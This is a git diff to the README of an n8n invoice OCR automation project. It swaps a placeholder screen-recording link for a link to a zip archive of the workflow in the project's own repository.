@@ -37,7 +37,7 @@ This system automates the entire invoice processing workflow—from detecting ne
 Here is a full walkthrough of the automated invoice processing system — including Google Drive detection, OCR extraction, AI parsing, and Excel export.
 
 ▶️ **Watch the screen recording:**  
-https://github.com/yourusername/yourrepo/assets/your-video-link
+https://github.com/Dishaa01423/Invoice_OCR/blob/main/n8n_invoice_OCR.zip
 
 ---
 ## ✨ Features
